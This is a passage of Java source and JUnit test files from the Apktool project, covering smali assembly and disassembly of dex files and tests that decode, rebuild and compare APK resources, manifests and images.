    private static final String TAG = SmaliBuilder.class.getName();

    private static final boolean VERBOSE_ERRORS = false;
    private static final boolean PRINT_TOKENS = false;

    private final int mApiLevel;

    public SmaliBuilder(int apiLevel) {
        // #3641 - Limit opcode API level to 29 or below (dex version up to 039).
        mApiLevel = Math.min(apiLevel, 29);
    }

    public void build(File smaliDir, File dexFile) throws AndrolibException {
        try {
            DexBuilder dexBuilder = new DexBuilder(mApiLevel > 0 ? Opcodes.forApi(mApiLevel) : Opcodes.getDefault());

            for (String fileName : new FileDirectory(smaliDir).getFiles(true)) {
                File smaliFile = new File(smaliDir, fileName);

                if (!fileName.endsWith(".smali")) {
                    Log.w(TAG, "Unknown file type, ignoring: " + smaliFile);
                    continue;
                }

                boolean success;
                Exception cause;
                try {
                    success = buildFile(smaliFile, dexBuilder);
                    cause = null;
                } catch (Exception ex) {
                    success = false;
                    cause = ex;
                }
                if (!success) {
                    AndrolibException ex = new AndrolibException("Could not smali file: " + smaliFile);
                    if (cause != null) {
                        ex.initCause(cause);
                    }
                    throw ex;
                }
            }

            if (dexFile.exists()) {
                OS.rmfile(dexFile);
            } else {
                File parentDir = dexFile.getParentFile();
                if (parentDir != null) {
                    OS.mkdir(parentDir);
                }
            }

            dexBuilder.writeTo(new FileDataStore(dexFile));
        } catch (DirectoryException | IOException | RuntimeException ex) {
            throw new AndrolibException("Could not smali folder: " + smaliDir.getName(), ex);
        }
    }

    private boolean buildFile(File smaliFile, DexBuilder dexBuilder) throws IOException, RecognitionException {
        try (InputStreamReader reader = new InputStreamReader(
                Files.newInputStream(smaliFile.toPath()), StandardCharsets.UTF_8)) {
            smaliFlexLexer lexer = new smaliFlexLexer(reader, mApiLevel);
            lexer.setSourceFile(smaliFile);

            CommonTokenStream tokens = new CommonTokenStream(lexer);

            if (PRINT_TOKENS) {
                for (Token token : tokens.getTokens()) {
                    if (token.getChannel() != smaliParser.HIDDEN) {
                        System.out.println(smaliParser.tokenNames[token.getType()] + ": " + token.getText());
                    }
                }
            }

            smaliParser parser = new smaliParser(tokens);
            parser.setApiLevel(mApiLevel);
            parser.setVerboseErrors(VERBOSE_ERRORS);

            smaliParser.smali_file_return result = parser.smali_file();

            if (parser.getNumberOfSyntaxErrors() > 0 || lexer.getNumberOfSyntaxErrors() > 0) {
                return false;
            }

            CommonTree tree = result.getTree();
            CommonTreeNodeStream treeStream = new CommonTreeNodeStream(tree);
            treeStream.setTokenStream(tokens);

            smaliTreeWalker treeWalker = new smaliTreeWalker(treeStream);
            treeWalker.setApiLevel(mApiLevel);
            treeWalker.setVerboseErrors(VERBOSE_ERRORS);
            treeWalker.setDexBuilder(dexBuilder);
            treeWalker.smali_file();

            return treeWalker.getNumberOfSyntaxErrors() == 0;
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/smali/SmaliDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.smali;

import brut.androlib.exceptions.AndrolibException;
import brut.util.OS;
import com.android.tools.smali.baksmali.Baksmali;
import com.android.tools.smali.baksmali.BaksmaliOptions;
import com.android.tools.smali.dexlib2.analysis.InlineMethodResolver;
import com.android.tools.smali.dexlib2.dexbacked.DexBackedDexFile;
import com.android.tools.smali.dexlib2.dexbacked.DexBackedOdexFile;
import com.android.tools.smali.dexlib2.dexbacked.ZipDexContainer;

import java.io.File;
import java.io.IOException;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

public class SmaliDecoder {
    private final ZipDexContainer mDexContainer;
    private final boolean mDebugMode;
    private final Set<String> mDexFiles;
    private final AtomicInteger mInferredApiLevel;

    public SmaliDecoder(File apkFile, boolean debugMode) throws AndrolibException {
        mDexContainer = new ZipDexContainer(apkFile, null);
        // ZipDexContainer is lazily initialized and not thread-safe. Eagerly initialize on the constructing thread.
        try {
            mDexContainer.getEntry("");
        } catch (IOException ex) {
            throw new AndrolibException("Could not open apk file: " + apkFile, ex);
        }
        mDebugMode = debugMode;
        mDexFiles = ConcurrentHashMap.newKeySet();
        mInferredApiLevel = new AtomicInteger();
    }

    public Set<String> getDexFiles() {
        return mDexFiles;
    }

    public int getInferredApiLevel() {
        return mInferredApiLevel.get();
    }

    public void decode(String dexName, File outDir) throws AndrolibException {
        try {
            // Fetch the requested dex file from the dex container.
            ZipDexContainer.DexEntry<DexBackedDexFile> dexEntry = mDexContainer.getEntry(dexName);
            if (dexEntry == null) {
                throw new AndrolibException("Could not find file: " + dexName);
            }

            // Add the requested dex file.
            Map<Integer, DexBackedDexFile> dexFiles = new TreeMap<>();
            dexFiles.put(1, dexEntry.getDexFile());

            // Add additional dex files if it's a multi-dex container.
            for (String dexEntryName : mDexContainer.getDexEntryNames()) {
                if (dexEntryName.equals(dexName)) {
                    continue;
                }

                String prefix = dexName + "/";
                if (!dexEntryName.startsWith(prefix)) {
                    continue;
                }

                int dexNum;
                try {
                    dexNum = Integer.parseInt(dexEntryName.substring(prefix.length()));
                } catch (NumberFormatException ignored) {
                    continue;
                }
                if (dexNum > 1) {
                    dexFiles.put(dexNum, mDexContainer.getEntry(dexEntryName).getDexFile());
                }
            }

            // Decode the dex files into separate folders.
            for (Map.Entry<Integer, DexBackedDexFile> entry : dexFiles.entrySet()) {
                int dexNum = entry.getKey();
                DexBackedDexFile dexFile = entry.getValue();

                if (dexFile.supportsOptimizedOpcodes()) {
                    throw new AndrolibException("Cannot disassemble an odex file without deodexing it: " + dexName);
                }

                String dirName = "smali";
                if (dexNum > 1 || !dexName.equals("classes.dex")) {
                    dirName += "_" + dexName.substring(0, dexName.lastIndexOf('.')).replace('/', '@');
                    if (dexNum > 1) {
                        dirName += dexNum;
                    }
                }

                decodeFile(dexFile, new File(outDir, dirName));
            }

            mDexFiles.add(dexName);
        } catch (IOException ex) {
            throw new AndrolibException("Could not baksmali file: " + dexName, ex);
        }
    }

    private void decodeFile(DexBackedDexFile dexFile, File smaliDir) {
        int jobs = Math.min(Runtime.getRuntime().availableProcessors(), 6);

        BaksmaliOptions options = new BaksmaliOptions();
        options.parameterRegisters = true;
        options.localsDirective = true;
        options.sequentialLabels = true;
        options.debugInfo = mDebugMode;
        options.codeOffsets = false;
        options.accessorComments = false;
        options.allowOdex = false;
        options.deodex = false;
        options.implicitReferences = false;
        options.normalizeVirtualMethods = false;
        options.registerInfo = 0;

        if (dexFile instanceof DexBackedOdexFile) {
            options.inlineResolver = InlineMethodResolver.createInlineMethodResolver(
                ((DexBackedOdexFile) dexFile).getOdexVersion());
        }

        OS.mkdir(smaliDir);
        Baksmali.disassembleDexFile(dexFile, smaliDir, jobs, options);

        int apiLevel = dexFile.getOpcodes().api;
        mInferredApiLevel.updateAndGet(cur -> (cur == 0 || cur > apiLevel) ? apiLevel : cur);
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/AndResGuardTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class AndResGuardTest extends BaseTest {
    private static final String TEST_APK = "issue1170.apk";

    @BeforeClass
    public static void beforeClass() throws Exception {
        copyResourceDir(AndResGuardTest.class, "issue1170", sTmpDir);
    }

    @Test
    public void checkifAndResDecodeRemapsRFolder() throws Exception {
        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "res/mipmap-hdpi-v4/a.png").isFile());
    }

    @Test
    public void checkIfAndResDecodeIgnoresRFolderInRawMode() throws Exception {
        sConfig.setDecodeResources(Config.DecodeResources.NONE);

        File testApk = new File(sTmpDir, TEST_APK);
        File testDir = new File(testApk + ".out.raw");
        new ApkDecoder(testApk, sConfig).decode(testDir);

        assertTrue(new File(testDir, "unknown/r/a/a.png").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/AndroidOreoNotSparseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class AndroidOreoNotSparseTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue1594-orig");
        sTestNewDir = new File(sTmpDir, "issue1594-new");

        log("Unpacking not_sparse.apk...");
        copyResourceDir(AndroidOreoNotSparseTest.class, "issue1594", sTestOrigDir);

        log("Decoding not_sparse.apk...");
        File testApk = new File(sTestOrigDir, "not_sparse.apk");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);

        log("Building not_sparse.apk...");
        new ApkBuilder(sTestNewDir, sConfig).build(testApk);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/AndroidOreoSparseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;

public class AndroidOreoSparseTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "issue1594-orig");
        sTestNewDir = new File(sTmpDir, "issue1594-new");

        log("Unpacking sparse.apk...");
        copyResourceDir(AndroidOreoSparseTest.class, "issue1594", sTestOrigDir);

        log("Decoding sparse.apk...");
        File testApk = new File(sTestOrigDir, "sparse.apk");
        new ApkDecoder(testApk, sConfig).decode(sTestNewDir);

        log("Building sparse.apk...");
        new ApkBuilder(sTestNewDir, sConfig).build(testApk);
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
        assertTrue(sTestOrigDir.isDirectory());
    }

    @Test
    public void ensureStringsOreoTest() {
        assertTrue(new File(sTestNewDir, "res/values-v26/strings.xml").isFile());
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/BaseTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.Config;
import brut.androlib.res.Framework;
import brut.common.Log;
import brut.directory.FileDirectory;
import brut.util.OS;

import java.io.File;
import java.io.FileReader;
import java.io.InputStream;
import java.io.IOException;
import java.io.Reader;
import java.net.URL;
import java.net.URLDecoder;
import java.nio.file.Files;

import org.junit.*;
import static org.junit.Assert.assertTrue;
import org.custommonkey.xmlunit.*;
import static org.custommonkey.xmlunit.XMLAssert.assertXMLEqual;

public class BaseTest {
    private static final String TAG = "TEST";

    protected static Config sConfig;
    protected static File sTmpDir;
    protected static File sTestOrigDir;
    protected static File sTestNewDir;

    static {
        XMLUnit.setEnableXXEProtection(true);
        XMLUnit.setIgnoreAttributeOrder(true);
        XMLUnit.setIgnoreWhitespace(true);
    }

    private static void cleanFrameworkFile() throws Exception {
        File apkFile = new File(new Framework(sConfig).getDirectory(), "1.apk");
        if (apkFile.isFile()) {
            OS.rmfile(apkFile.getAbsolutePath());
        }
    }

    @BeforeClass
    public static void beforeEachClass() throws Exception {
        sConfig = new Config(TAG);
        cleanFrameworkFile();

        sTmpDir = OS.createTempDirectory();
    }

    @AfterClass
    public static void afterEachClass() throws Exception {
        sTestOrigDir = null;
        sTestNewDir = null;

        OS.rmdir(sTmpDir);
        sTmpDir = null;

        cleanFrameworkFile();
        sConfig = null;
    }

    @Before
    public void beforeEachTest() {
        sConfig = new Config(TAG);
    }

    protected static void log(String message) {
        Log.i(TAG, message);
    }

    protected static void log(String message, Object... args) {
        Log.i(TAG, message, args);
    }

    protected static void copyResourceDir(Class<?> clz, String dirPath, File outDir) throws Exception {
        if (clz == null) {
            clz = Class.class;
        }

        URL dirURL = clz.getClassLoader().getResource(dirPath);
        if (dirURL != null && dirURL.getProtocol().equals("file")) {
            String jarPath = URLDecoder.decode(dirURL.getFile(), "UTF-8");
            new FileDirectory(jarPath).copyToDir(outDir);
            return;
        }

        if (dirURL == null) {
            String className = clz.getName().replace('.', '/') + ".class";
            dirURL = clz.getClassLoader().getResource(className);
        }

        if (dirURL.getProtocol().equals("jar")) {
            String jarPath = URLDecoder.decode(dirURL.getPath().substring(5, dirURL.getPath().indexOf('!')), "UTF-8");
            new FileDirectory(jarPath).copyToDir(outDir);
        }
    }

    protected static String readTextFile(File file) throws Exception {
        return new String(Files.readAllBytes(file.toPath()));
    }

    protected static byte[] readHeaderOfFile(File file, int size) throws Exception {
        byte[] buffer = new byte[size];

        try (InputStream in = Files.newInputStream(file.toPath())) {
            if (in.read(buffer) != buffer.length) {
                throw new IOException("File size too small for buffer length: " + size);
            }
        }

        return buffer;
    }

    protected static String replaceNewlines(String value) {
        return value.replaceAll("[\n\r]", "");
    }

    protected static void compareBinaryFolder(String path) throws Exception {
        compareBinaryFolder(sTestOrigDir, sTestNewDir, path);
    }

    protected static void compareBinaryFolder(File controlDir, File testDir, String path) throws Exception {
        File controlBase = new File(controlDir, path);
        File testBase = new File(testDir, path);

        boolean exists = true;

        for (String fileName : new FileDirectory(controlBase).getFiles(true)) {
            File control = new File(controlBase, fileName);
            File test = new File(testBase, fileName);

            if (!control.isFile() || !test.isFile()) {
                exists = false;
            }
        }

        assertTrue(exists);
    }

    protected static void compareValuesFiles(String path) throws Exception {
        compareValuesFiles(sTestOrigDir, sTestNewDir, path);
    }

    protected static void compareValuesFiles(File controlDir, File testDir, String path) throws Exception {
        compareXmlFiles(controlDir, testDir, "res/" + path, new ElementNameAndAttributeQualifier("name"));
    }

    protected static void compareXmlFiles(String path) throws Exception {
        compareXmlFiles(sTestOrigDir, sTestNewDir, path, null);
    }

    protected static void compareXmlFiles(File controlDir, File testDir, String path) throws Exception {
        compareXmlFiles(controlDir, testDir, path, null);
    }

    private static void compareXmlFiles(File controlDir, File testDir, String path, ElementQualifier qualifier) throws Exception {
        try (
            Reader control = new FileReader(new File(controlDir, path));
            Reader test = new FileReader(new File(testDir, path))
        ) {
            if (qualifier == null) {
                assertXMLEqual(control, test);
                return;
            }

            DetailedDiff diff = new DetailedDiff(new Diff(control, test));
            diff.overrideElementQualifier(qualifier);

            assertTrue(path + ": " + diff.getAllDifferences().toString(), diff.similar());
        }
    }
}

```

`brut.apktool/apktool-lib/src/test/java/brut/androlib/BuildAndDecodeApkTest.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib;

import brut.androlib.meta.ApkInfo;
import brut.directory.ExtFile;
import brut.util.OSDetection;
import brut.xml.XmlUtils;
import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;

import org.junit.*;
import static org.junit.Assert.*;
import static org.junit.Assume.assumeTrue;

public class BuildAndDecodeApkTest extends BaseTest {
    private static ExtFile sTestApk;

    @BeforeClass
    public static void beforeClass() throws Exception {
        sTestOrigDir = new File(sTmpDir, "testapp-orig");
        sTestNewDir = new File(sTmpDir, "testapp-new");

        log("Unpacking testapp...");
        copyResourceDir(BuildAndDecodeApkTest.class, "testapp", sTestOrigDir);

        sConfig.setVerbose(true);

        log("Building testapp.apk...");
        sTestApk = new ExtFile(sTmpDir, "testapp.apk");
        new ApkBuilder(sTestOrigDir, sConfig).build(sTestApk);

        log("Decoding testapp.apk...");
        new ApkDecoder(sTestApk, sConfig).decode(sTestNewDir);
    }

    @AfterClass
    public static void afterClass() throws Exception {
        sTestApk.close();
    }

    @Test
    public void buildAndDecodeTest() {
        assertTrue(sTestNewDir.isDirectory());
    }

    @Test
    public void confirmFeatureFlagsRecorded() throws Exception {
        ApkInfo testInfo = ApkInfo.load(sTestNewDir);
        assertTrue(testInfo.getFeatureFlags().get("brut.feature.permission"));
        assertTrue(testInfo.getFeatureFlags().get("brut.feature.activity"));
    }

    @Test
    public void confirmZeroByteFileExtensionIsNotStored() throws Exception {
        ApkInfo testInfo = ApkInfo.load(sTestNewDir);
        assertFalse(testInfo.getDoNotCompress().contains("jpg"));
    }

    @Test
    public void confirmZeroByteFileIsStored() throws Exception {
        ApkInfo testInfo = ApkInfo.load(sTestNewDir);
        assertTrue(testInfo.getDoNotCompress().contains("assets/0byte_file.jpg"));
    }

    @Test
    public void confirmManifestStructureTest() throws Exception {
        compareXmlFiles("AndroidManifest.xml");
    }

    @Test
    public void confirmPlatformManifestValuesTest() throws Exception {
        Document doc = XmlUtils.loadDocument(new File(sTestNewDir, "AndroidManifest.xml"));
        Node application = doc.getElementsByTagName("manifest").item(0);
        NamedNodeMap attrs = application.getAttributes();

        Node platformBuildVersionNameAttr = attrs.getNamedItem("platformBuildVersionName");
        assertEquals("6.0-2438415", platformBuildVersionNameAttr.getNodeValue());

        Node platformBuildVersionCodeAttr = attrs.getNamedItem("platformBuildVersionCode");
        assertEquals("23", platformBuildVersionCodeAttr.getNodeValue());

        Node compileSdkVersionAttr = attrs.getNamedItem("compileSdkVersion");
        assertNull("compileSdkVersion should have been stripped", compileSdkVersionAttr);

        Node compileSdkVersionCodenameAttr = attrs.getNamedItem("compileSdkVersionCodename");
        assertNull("compileSdkVersionCodename should have been stripped", compileSdkVersionCodenameAttr);
    }

    @Test
    public void valuesAnimsTest() throws Exception {
        compareValuesFiles("values-mcc001/anims.xml");
    }

    @Test
    public void valuesArraysTest() throws Exception {
        compareValuesFiles("values-mcc001/arrays.xml");
    }

    @Test
    public void valuesArraysCastingTest() throws Exception {
        compareValuesFiles("values-mcc002/arrays.xml");
        compareValuesFiles("values-mcc003/arrays.xml");
    }

    @Test
    public void valuesAttrsTest() throws Exception {
        compareValuesFiles("values/attrs.xml");
    }

    @Test
    public void valuesBoolsTest() throws Exception {
        compareValuesFiles("values-mcc001/bools.xml");
    }

    @Test
    public void valuesColorsTest() throws Exception {
        compareValuesFiles("values/colors.xml");
        compareValuesFiles("values-mcc001/colors.xml");
    }

    @Test
    public void valuesDimensTest() throws Exception {
        compareValuesFiles("values-mcc001/dimens.xml");
    }

    @Test
    public void valuesDrawablesTest() throws Exception {
        compareValuesFiles("values-mcc001/drawables.xml");
    }

    @Test
    public void valuesIdsTest() throws Exception {
        compareValuesFiles("values-mcc001/ids.xml");
    }

    @Test
    public void valuesIntegersTest() throws Exception {
        compareValuesFiles("values-mcc001/integers.xml");
    }

    @Test
    public void valuesLayoutsTest() throws Exception {
        compareValuesFiles("values-mcc001/layouts.xml");
    }

    @Test
    public void valuesPluralsTest() throws Exception {
        compareValuesFiles("values-mcc001/plurals.xml");
    }

    @Test
    public void valuesOverlayableTest() throws Exception {
        compareValuesFiles("values/overlayable.xml");
    }

    @Test
    public void valuesStringsTest() throws Exception {
        compareValuesFiles("values/strings.xml");
        compareValuesFiles("values-mcc001/strings.xml");
    }

    @Test
    public void valuesStylesTest() throws Exception {
        compareValuesFiles("values-mcc001/styles.xml");
    }

    @Test
    public void valuesExtraLongTest() throws Exception {
        compareValuesFiles("values-en/strings.xml");
    }

    @Test
    public void valuesMaxLengthTest() throws Exception {
        Document doc = XmlUtils.loadDocument(new File(sTestNewDir, "res/values-en/strings.xml"));

        // long_string_32767 should be exactly 0x7FFF chars of "a",
        // which is the longest allowed length for UTF-8 strings.
        // String longer than that is replaced with "STRING_TOO_LARGE".
        // valuesExtraLongTest covers this scenario, but we want a specific test
        // for such an edge case.
        String expression = "/resources/string[@name='long_string_32767']/text()";
        String str = XmlUtils.evaluateXPath(doc, expression, String.class);
        assertEquals(0x7FFF, str.length());
    }

    @Test
    public void valuesGrammaticalGenderTest() throws Exception {
        compareValuesFiles("values-neuter/strings.xml");
        compareValuesFiles("values-feminine/strings.xml");
    }

    @Test
    public void bug702Test() throws Exception {
        compareValuesFiles("values-mcc001-mnc00/strings.xml");
    }

    @Test
    public void valuesReferencesTest() throws Exception {
        compareValuesFiles("values-mcc002/strings.xml");
    }

    @Test
    public void crossTypeTest() throws Exception {
        compareValuesFiles("values-mcc003/strings.xml");
        compareValuesFiles("values-mcc003/integers.xml");
        compareValuesFiles("values-mcc003/bools.xml");
    }

    @Test
    public void qualifiersTest() throws Exception {
        compareValuesFiles(
            "values-mcc004-mnc04-en-rUS-ldrtl-sw100dp-w200dp-h300dp"
          + "-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key"
          + "-navhidden-dpad-v26/strings.xml");
    }

    @Test
    public void shortendedMncTest() throws Exception {
        compareValuesFiles("values-mcc001-mnc01/strings.xml");
    }

    @Test
    public void shortMncHtcTest() throws Exception {
        compareValuesFiles("values-mnc01/strings.xml");
    }

    @Test
    public void shortMncv2Test() throws Exception {
        compareValuesFiles("values-mcc238-mnc06/strings.xml");
    }

    @Test
    public void longMncTest() throws Exception {
        compareValuesFiles("values-mcc238-mnc870/strings.xml");
    }

    @Test
    public void anyDpiTest() throws Exception {
        compareValuesFiles("values-watch/strings.xml");
    }

    @Test
    public void packed3CharsTest() throws Exception {
        compareValuesFiles("values-ast-rES/strings.xml");
    }

    @Test
    public void rightToLeftTest() throws Exception {
        compareValuesFiles("values-ldrtl/strings.xml");
    }

    @Test
    public void threeLetterLangBcp47Test() throws Exception {
        compareValuesFiles("values-ast/strings.xml");
    }

    @Test
    public void androidOStringTest() throws Exception {
        compareValuesFiles("values-ast/strings.xml");
    }

    @Test
    public void twoLetterNotHandledAsBcpTest() {
        assertTrue(new File(sTestNewDir, "res/values-fr").isDirectory());
    }

    @Test
    public void twoLetterLangBcp47Test() throws Exception {
        compareValuesFiles("values-en-rUS/strings.xml");
    }

    @Test
    public void scriptBcp47Test() throws Exception {
        compareValuesFiles("values-b+en+Latn+US/strings.xml");
    }

    @Test
    public void regionLocaleBcp47Test() throws Exception {
        compareValuesFiles("values-b+en+Latn+419/strings.xml");
    }

    @Test
    public void numericalRegionBcp47Test() throws Exception {
        compareValuesFiles("values-b+eng+419/strings.xml");
    }

    @Test
    public void variantBcp47Test() throws Exception {
        compareValuesFiles("values-b+en+US+posix/strings.xml");
    }

    @Test
    public void valuesBcp47LanguageVariantTest() throws Exception {
        compareValuesFiles("values-b+iw+660/strings.xml");
    }

    @Test
    public void valuesBcp47LanguageScriptRegionVariantTest() throws Exception {
        compareValuesFiles("values-b+ast+Latn+IT+arevela/strings.xml");
        compareValuesFiles("values-b+ast+Hant+IT+arabext/strings.xml");
    }

    @Test
    public void api23ConfigurationsTest() throws Exception {
        compareValuesFiles("values-round/strings.xml");
        compareValuesFiles("values-notround/strings.xml");
    }

    @Test
    public void api26ConfigurationsTest() throws Exception {
        compareValuesFiles("values-widecg-v26/strings.xml");
        compareValuesFiles("values-lowdr-v26/strings.xml");
        compareValuesFiles("values-nowidecg-v26/strings.xml");
        compareValuesFiles("values-vrheadset-v26/strings.xml");
    }

    @Test
    public void leadingDollarSignResourceNameTest() throws Exception {
        compareXmlFiles("res/drawable/$avd_hide_password__0.xml");
        compareXmlFiles("res/drawable/$avd_show_password__0.xml");
        compareXmlFiles("res/drawable/$avd_show_password__1.xml");
        compareXmlFiles("res/drawable/$avd_show_password__2.xml");
        compareXmlFiles("res/drawable/avd_show_password.xml");
    }

    @Test
    public void fontTest() throws Exception {
        File fontXml = new File(sTestNewDir, "res/font/lobster.xml");
        File fontFile = new File(sTestNewDir, "res/font/lobster_regular.otf");

        // Per #1662, ensure font file is not encoded.
        assertTrue(fontXml.isFile());
        compareXmlFiles("res/font/lobster.xml");

        // If we properly skipped decoding the font (otf) file, this file should not exist
        assertFalse(new File(sTestNewDir, "res/values/fonts.xml").isFile());
        assertTrue(fontFile.isFile());
    }

    @Test
    public void xmlReferenceAttributeTest() throws Exception {
        compareXmlFiles("res/layout/issue1040.xml");
    }

    @Test
    public void xmlCustomAttributeTest() throws Exception {
        compareXmlFiles("res/layout/issue1063.xml");
    }

    @Test
    public void xmlCustomAttrsNotAndroidTest() throws Exception {
        compareXmlFiles("res/layout/issue1157.xml");
    }

    @Test
    public void xmlExpectMatchParentTest() throws Exception {
        compareXmlFiles("res/layout/issue1274.xml");
    }

    @Test
    public void xmlUniformAutoTextTest() throws Exception {
        compareXmlFiles("res/layout/issue1674.xml");
    }

    @Test
    public void navigationResourceTest() throws Exception {
        compareXmlFiles("res/navigation/nav_graph.xml");
    }

    @Test
    public void xmlXsdFileTest() throws Exception {
        compareXmlFiles("res/xml/ww_box_styles_schema.xsd");
    }

    @Test
    public void xmlLiteralsTest() throws Exception {
        compareXmlFiles("res/xml/literals.xml");
    }

    @Test
    public void xmlReferencesTest() throws Exception {
        compareXmlFiles("res/xml/references.xml");
    }

    @Test
    public void xmlAccessibilityTest() throws Exception {
        compareXmlFiles("res/xml/accessibility_service_config.xml");
    }

    @Test
    public void drawableNoDpiTest() throws Exception {
        compareBinaryFolder("res/drawable-nodpi");
    }

    @Test
    public void drawableAnyDpiTest() throws Exception {
        compareBinaryFolder("res/drawable-anydpi");
    }

    @Test
    public void drawableNumberedDpiTest() throws Exception {
        compareBinaryFolder("res/drawable-534dpi");
    }

    @Test
    public void drawableLdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-ldpi");
    }

    @Test
    public void drawableMdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-mdpi");
    }

    @Test
    public void drawableTvdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-tvdpi");
    }

    @Test
    public void drawableXhdpiTest() throws Exception {
        compareBinaryFolder("res/drawable-xhdpi");
    }

    @Test
    public void ninePatchImageColorTest() throws Exception {
        String fileName = "res/drawable-xhdpi/ninepatch.9.png";

        File control = new File(sTestOrigDir, fileName);
        File test = new File(sTestNewDir, fileName);

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // lets start with 0,0 - empty
        assertEquals(controlImage.getRGB(0, 0), testImage.getRGB(0, 0));

        // then with 30, 0 - black
        assertEquals(controlImage.getRGB(30, 0), testImage.getRGB(30, 0));

        // then 30, 30 - blue
        assertEquals(controlImage.getRGB(30, 30), testImage.getRGB(30, 30));
    }

    @Test
    public void issue1508Test() throws Exception {
        String fileName = "res/drawable-xhdpi/btn_zoom_up_normal.9.png";

        File control = new File(sTestOrigDir, fileName);
        File test = new File(sTestNewDir, fileName);

        BufferedImage controlImage = ImageIO.read(control);
        BufferedImage testImage = ImageIO.read(test);

        // 0, 0 = clear
        assertEquals(controlImage.getRGB(0, 0), testImage.getRGB(0, 0));

        // 30, 0 = black line
        assertEquals(controlImage.getRGB(0, 30), testImage.getRGB(0, 30));

        // 30, 30 = greyish button
